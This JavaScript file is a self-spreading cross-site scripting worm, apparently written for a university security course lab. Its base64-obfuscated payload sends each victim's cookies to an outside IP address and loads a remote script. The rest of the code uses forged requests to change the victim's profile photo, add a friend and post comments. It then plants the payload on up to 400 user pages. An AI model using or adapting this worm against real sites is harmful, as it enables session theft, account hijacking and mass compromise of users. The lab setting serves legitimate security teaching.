const xss_payload = "<script>eval(atob(\"JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xOC4yMjMuOTQuMTE1L2FybWJvb2suanM/Y29va2llPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk=\"));</script>";
const my_id = 141;
function delayed() {
	$.ajax({
		type: "GET",
		url: "http://csec380-core.csec.rit.edu:86/change_photo.php",
		data: {type: "profile", url: "https://i.imgur.com/uQ9tsyt.png"},
		async: false
	});

	//
	// Only execute the IF block once.
	//
    const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
    if (cookies.get("commented") != "yes") {
    	$.ajax({
			type: "GET",
			url: "http://csec380-core.csec.rit.edu:86/add_friend.php",
			data: {id: my_id},
			async: false
		});
		$.ajax({
			type: "GET",
			url: "http://csec380-core.csec.rit.edu:86/add_comment.php",
			data: {id: my_id, comment: "I was XSS'd at " + (new Date()).toString()},
			async: false
		});

		//
		// Spread our worm to all user pages.
		//
		for(let i = 0; i < 400; i++) {
			$.ajax({
				type: "GET",
				url: "http://csec380-core.csec.rit.edu:86/home.php",
				data: {id: i},
				success: function(data) {
					if(data.includes("Error") || i == my_id) {
						console.log("Bad ID " + i);
						return;
					}

					$.ajax({
						type: "GET",
						url: "http://csec380-core.csec.rit.edu:86/add_comment.php",
						data: {id: i, comment: xss_payload},
						async: false
					});
				}
			});
		}

        document.cookie = "commented=yes";
    }

}

setTimeout(delayed, 500);
